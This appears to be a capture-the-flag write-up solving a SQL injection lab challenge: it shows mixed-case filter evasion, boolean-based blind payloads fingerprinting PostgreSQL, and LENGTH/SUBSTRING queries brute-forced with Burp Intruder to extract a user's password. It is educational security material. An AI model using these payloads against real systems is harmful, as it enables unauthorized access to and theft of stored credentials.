## Medium lever
### Mission
What is the pw of 'haodz' user??

### Hint
Quite similar to the easy challenge~~

### Approach
Watch the web!

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/9.png" width="666px">
</p>

See the timeline function and id with value

I try a few values as: -0, 1, 2, 12345,..

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/10.png" width="666px">
</p>

*This function is return user by id of user.*

Now i try many basic payload of SQL injection `' " --` as `1', 1", 1' or 1=1--, 1' or '1'='1,..`

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/11.png" width="666px">
</p>

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/12.png" width="666px">
</p>

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/13.png" width="666px">
</p>

*Watch the result! The payload `1' or '1'='1` was inserted successfully*

Now i try use ORDER BY clause to determine the number of columns

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/14.png" width="666px">
</p>

```sql
1' ORDER BY '1' or '1'='1
1' ORdEr By '1' or '1'='1
```

(Change the upper and lower case frequency of characters to pass the filter)

*I don't see any return value on the web*

I try attack with Boolean-base

Try `1' and '1'='1, 1' anD '1'='1,..`

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/15.png" width="666px">
</p>

*The payload `1' anD '1'='1` got past*

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/16.png" width="666px">
</p>

See that! The payload `1' anD '1'='2` returns a web stage other the payload `1' anD '1'='1`

I continue to check the type of database 

```
1' anD (SEleCT 'o' fROm (SEleCT veRsIOn fROm v$inStance)) = 'o
1' anD (SEleCT 'o' fROm @@veRsIOn) = 'o
1' anD (SEleCT 'o' fROm veRsIOn()) = 'o
```

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/17.png" width="666px">
</p>

The payload `1' anD (SEleCT 'o' fROm veRsIOn()) = 'o` got past, which mean `veRsIOn()` is executed. Okay! The type of database is PostgreSQL

I guess the name of table needs exploit also is **user**, and try `1' anD (SEleCT 'a' fROm (SEleCT * fROm "user") LimiT 1) = 'a`

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/18.png" width="666px">
</p>

The payload `1' anD (SEleCT 'a' fROm (SEleCT * fROm "user") LimiT 1) = 'a` got past, which mean `SEleCT * fROm "user"` is executed => the table name is **user**

It seems like the table and column names of this challenge are the same as the **Easy challenge**, but i need the password of 'haodz' username.

I use LENGTH clause to determine the length of password and SUBSTRING clause to determine the password, let's do it!

`1' anD LENgtH((SEleCT password fROm "user" WheRE username='haodz'))='1`

Use Burp Intruder to scan length password from 1 to 50

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/19.png" width="666px">
</p>

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/20.png" width="666px">
</p>

*See that! The length of password is 32*

Now i will use SUBSTRING clause to check each character in the password

`1' anD SuBStRinG((SEleCT password fROm "user" WheRE username='haodz'), 1, 1)='0`

I guess the password will contain the characters `a-z, A-Z, 0-9`. And because the length of password is 32, so i use **Cluster bomb** to attack

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/21.png" width="666px">
</p>

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/22.png" width="666px">
</p>

*Payload 1 and Payload 2 correspond to the position and value of the password*

**After sorting, get the password: `0192023a7bbd73250516f069df18b500`**